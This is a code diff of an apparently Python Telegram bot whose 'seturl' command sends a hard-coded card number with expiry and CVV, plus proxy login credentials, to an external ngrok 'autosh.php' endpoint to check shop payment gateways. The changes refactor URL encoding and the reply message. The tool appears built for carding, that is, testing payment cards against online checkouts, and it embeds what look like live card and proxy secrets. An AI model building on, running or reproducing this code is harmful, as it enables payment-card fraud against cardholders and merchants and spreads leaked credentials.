@@ -2604,6 +2604,8 @@ import aiohttp
 from db import get_user, update_user
 from html import escape
 import logging
+import urllib.parse
+import json
 
 # Configure logging
 logging.basicConfig(
@@ -2632,7 +2634,7 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Construct proper URL starting with https://
     site_input = args[0].strip()
-    if not site_input.startswith("http://") and not site_input.startswith("https://"):
+    if not site_input.startswith(("http://", "https://")):
         site_input = f"https://{site_input}"
 
     # Send initial "Adding URL..." message
@@ -2640,12 +2642,15 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⏳ Adding URL: <code>{escape(site_input)}</code>...", parse_mode=ParseMode.HTML
     )
 
-    # Prepare API URL (fixed card for seturl)
+    # URL encode parameters
+    cc_param = urllib.parse.quote("4546788796826918|09|2030|781")
+    proxy_param = urllib.parse.quote("107.172.163.27:6543:nslqdeey:jhmrvnto65s1")
+    site_param = urllib.parse.quote(site_input)
+
+    # Construct API URL
     api_url = (
-        "https://7feeef80303d.ngrok-free.app/autosh.php"
-        "?cc=4546788796826918|09|2030|781"
-        f"&site={site_input}"
-        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        f"https://7feeef80303d.ngrok-free.app/autosh.php"
+        f"?cc={cc_param}&site={site_param}&proxy={proxy_param}"
     )
 
     logging.info(f"Calling API URL: {api_url}")
@@ -2668,31 +2673,41 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ Failed to check site: {e}\nAPI URL: {api_url}")
         return
 
-    # Extract API response
+    # Extract API response safely
     response_text = data.get("Response", "-")
-    price = data.get("Price") or "1.0"
+    price = data.get("Price", "1.0")
     gateway = data.get("Gateway", "-")
+    proxy_status = data.get("ProxyStatus", "-")
+    proxy_ip = data.get("ProxyIP", "-")
 
     logging.info(f"Parsed API data -> Response: {response_text}, Price: {price}, Gateway: {gateway}")
 
     # Update DB for the user
     await update_user(user_id, custom_url=site_input)
 
+    # Prepare pretty JSON for full response
+    pretty_response = json.dumps(data, indent=2)
+
     # Send final formatted message
     final_message = f"""
-═══[ {gateway.upper()} ]═══
+═══[ {escape(gateway.upper())} ]═══
 [✗] Site ➜ <code>{escape(site_input)}</code>
+[✗] Amount ➜ {escape(price)}
+[✗] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {escape(response_text)}
+[✗] Proxy Status ➜ {escape(proxy_status)}
+[✗] Proxy IP ➜ {escape(proxy_ip)}
 
-[✗] Amount ➜ {price}  
-[✗] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_text}
+――――――――――――――――
+⛓ Full API Response:
+<pre>{escape(pretty_response)}</pre>
 
 ――――――――――――――――
 [✗] 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ @{update.effective_user.username or update.effective_user.first_name}
-
 [✗] 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ kคli liຖนxx
 ――――――――――――――――
 """
     await msg.edit_text(final_message, parse_mode=ParseMode.HTML)
+
 
 
 
